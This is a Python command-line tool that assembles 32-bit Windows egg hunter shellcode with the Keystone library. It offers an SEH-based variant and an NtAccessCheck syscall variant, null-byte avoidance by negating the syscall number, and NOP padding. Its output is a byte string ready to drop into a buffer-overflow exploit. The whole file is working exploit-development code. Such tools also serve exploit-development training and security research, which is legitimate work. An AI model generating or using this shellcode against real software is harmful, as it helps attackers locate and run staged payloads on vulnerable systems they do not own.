import sys
import os
import argparse
from keystone import *

OUTPUT_PATH = None
ARGS = None

def setup_arguments():
    parser = argparse.ArgumentParser(description='EggHunter Generator.')
    parser.add_argument('--egghunter', action='store_true', help='Enable egg hunter mode.')
    parser.add_argument('--egg', help='Egg to use with the egg hunter, must be exactly 4 characters long.')
    parser.add_argument('--seh', action='store_true', help='Use SEH based egg hunter.')
    parser.add_argument('--ntaccess', help='Use NTACCESS based egg hunter, requires a value.')
    parser.add_argument('--nopbefore', type=int, default=0, help="Number of Nops to add before the Egghunter.")
    parser.add_argument('--nopafter', type=int, default=0, help="Number of Nops to add after the Egghunter.")
    parser.add_argument('-o', '--output', help='Output file of the founded results, e.x: -o "C:\\output.txt".')
    return parser.parse_args()

def calculate_negated_syscall(syscall_num):
    syscall_int = int(syscall_num, 16)
    negated_syscall = 0x100000000 - syscall_int
    return format(negated_syscall, '08x')

def string_to_hex(str_value):
    return ''.join(format(ord(c), '02x') for c in str_value)

def to_little_endian(hex_string):
    byte_array = bytes.fromhex(hex_string)
    little_endian_bytes = byte_array[::-1]
    little_endian_hex = little_endian_bytes.hex()
    return little_endian_hex

def generate_egghunter(CODE):
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    encoding, count = ks.asm(CODE)
    instructions = ""
    for dec in encoding:
        instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n")
    return (encoding, instructions)

def egghunter_seh(egg):
    nop_count_before = ARGS.nopbefore
    nop_count_after = ARGS.nopafter

    if not egg or len(egg) != 4:
        print("[!] The EGG must be provided and be exactly 4 characters long.")
        return

    hex_word = string_to_hex(egg)
    little_endian = to_little_endian(hex_word)

    CODE = (
        "	start: 									 "
        "		jmp get_seh_address 				;"
        "	build_exception_record: 				 "
        "		pop ecx 							;"
        f"		mov eax, 0x{little_endian}			;"
        "		push ecx 							;"
        "		push 0xffffffff 					;"
        "		xor ebx, ebx 						;"
        "		mov dword ptr fs:[ebx], esp 		;"
        "	is_egg: 								 "
        "		push 0x02 							;"
        "		pop ecx 							;"
        "		mov edi, ebx 						;"
        "		repe scasd 							;"
        "		jnz loop_inc_one 					;"
        "		jmp edi 							;"
        "	loop_inc_page: 							 "
        "		or bx, 0xfff 						;"
        "	loop_inc_one: 							 "
        "		inc ebx 							;"
        "		jmp is_egg 							;"
        "	get_seh_address: 						 "
        "		call build_exception_record 		;"
        "		push 0x0c 							;"
        "		pop ecx 							;"
        "		mov eax, [esp+ecx] 					;"
        "		mov cl, 0xb8						;"
        "		add dword ptr ds:[eax+ecx], 0x06	;"
        "		pop eax 							;"
        "		add esp, 0x10 						;"
        "		push eax 							;"
        "		xor eax, eax 						;"
        "		ret 								;"
    )

    encoding, instructions = generate_egghunter(CODE)

    if nop_count_before > 0:
        instructions = "\\x90" * nop_count_before + instructions
    if nop_count_after > 0:
        instructions += "\\x90" * nop_count_after

    out = "[+] Egg Hunter generated successfully\n"
    out += f"Egg Hunter size: {len(encoding)}\n"
    out += f"Egg Hunter size with NOPs: {len(encoding) + nop_count_before + nop_count_after}\n"
    out += f"Egg Hunter: egghunter = b\"{instructions}\""
    return out

def egghunter_nt(egg, ntaccess):
    nop_count_before = ARGS.nopbefore
    nop_count_after = ARGS.nopafter

    if not egg or len(egg) != 4:
        print("[!] The EGG must be provided and be exactly 4 characters long.")
        return

    hex_word = string_to_hex(egg)
    little_endian = to_little_endian(hex_word)

    CODE = (

        "							 "
        "	loop_inc_page:			 "
        "		or dx, 0x0fff		;"
        "	loop_inc_one:			 "
        "		inc edx				;"
        "	loop_check:				 "
        "		push edx			;"
        f"		push 0x{ntaccess} 			;"
        "		pop eax				;"
        "		int 0x2e			;"
        "		cmp al,05			;"
        "		pop edx				;"
        "	loop_check_valid:		 "
        "		je loop_inc_page	;"
        "	is_egg:					 "
        f"		mov eax, 0x{little_endian}	;"
        "		mov edi, edx		;"
        "		scasd				;"
        "		jnz loop_inc_one	;"
        "		scasd				;"
        "		jnz loop_inc_one	;"
        "	matched:				 "
        "		jmp edi				;"
    )

    encoding, instructions = generate_egghunter(CODE)

    # Check for null bytes
    if "\\x00" in instructions:
        print("[*] Null bytes detected in the egg hunter")
        user_choice = input("[*] Do you want to use negated syscall to avoid null bytes? (Y/N): ").lower()
        if user_choice == "y":
            negated_syscall_hex = calculate_negated_syscall(ntaccess)
            print(f"[+] Using negated syscall value: 0x{negated_syscall_hex}")
            CODE = (

                "							 "
                "	loop_inc_page:			 "
                "		or dx, 0x0fff		;"
                "	loop_inc_one:			 "
                "		inc edx				;"
                "	loop_check:				 "
                "		push edx			;"
                f"		mov eax, 0x{negated_syscall_hex}	;"
                "		neg eax				;"
                "		int 0x2e			;"
                "		cmp al,05			;"
                "		pop edx				;"
                "	loop_check_valid:		 "
                "		je loop_inc_page	;"
                "	is_egg:					 "
                f"		mov eax, 0x{little_endian}	;"
                "		mov edi, edx		;"
                "		scasd				;"
                "		jnz loop_inc_one	;"
                "		scasd				;"
                "		jnz loop_inc_one	;"
                "	matched:				 "
                "		jmp edi				;"
            )
            encoding, instructions = generate_egghunter(CODE)

    # Adding NOPs if specified
    if nop_count_before > 0:
        instructions = "\\x90" * nop_count_before + instructions
    if nop_count_after > 0:
        instructions += "\\x90" * nop_count_after

    out = "[+] Egg Hunter generated successfully\n"
    out += f"Egg Hunter size: {len(encoding)}\n"
    out += f"Egg Hunter size with NOPs: {len(encoding) + nop_count_before + nop_count_after}\n"
    out += f"Egg Hunter: egghunter = b\"{instructions}\""
    return out

def save_output(data):
    global OUTPUT_PATH
    if OUTPUT_PATH:
        try:
            with open(OUTPUT_PATH, 'w', encoding='utf-8') as file:
                file.write(data)
            log(f"Output saved to {OUTPUT_PATH}")
        except IOError as e:
            log(f"Error writing to file: {e}")
    else:
        log("No output path provided. Printing to console:")
        print(data)

def log(msg):
    print("[+] " + msg)

def run():
    global ARGS, OUTPUT_PATH
    ARGS = setup_arguments()

    if ARGS.output:
        if os.path.isdir(os.path.dirname(ARGS.output)):
            OUTPUT_PATH = ARGS.output
        else:
            log("Invalid output path. Results will be printed to console.")

    if ARGS.egghunter:
        if not ARGS.egg or len(ARGS.egg) != 4:
            sys.exit('Egg (--egg) must be provided and be exactly 4 characters long.')
        if not (ARGS.seh or ARGS.ntaccess):
            sys.exit('Either --seh or --ntaccess must be used with --egghunter.')

        if ARGS.seh:
            data = egghunter_seh(ARGS.egg)
            save_output(data)
        if ARGS.ntaccess:
            data = egghunter_nt(ARGS.egg, ARGS.ntaccess)
            save_output(data)

if __name__ == '__main__':
    run()
